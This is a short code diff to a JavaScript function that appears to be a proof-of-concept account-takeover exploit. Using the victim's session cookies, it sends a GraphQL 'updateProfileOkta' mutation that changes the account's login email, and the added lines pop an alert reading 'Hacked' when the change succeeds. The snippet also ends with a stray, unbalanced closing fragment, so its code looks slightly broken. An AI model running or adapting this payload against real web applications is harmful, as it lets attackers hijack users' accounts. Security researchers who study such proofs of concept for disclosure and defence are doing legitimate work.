@@ -20,7 +20,7 @@ async function s2() {
     })
   }).then(t=>t.json()).then(t=>t.data.gihProfile.id);
   
-  await fetch('/api/graphql', {
+  var r = await fetch('/api/graphql', {
     method: 'post',
     credentials: 'include',
       headers:{
@@ -33,6 +33,11 @@ async function s2() {
             "login": email,
             "newEmail":email
         }
-    })
+    }).then(t=>t.json())
+    if (r && r.data && r.data.updateProfileOkta && r.data.updateProfileOkta.status == 'Success') {
+    alert('Hacked');
+} else {
+      alert('Error:' + JSON.stringify(r))
+}
 }).then(t=>t.json())
 }
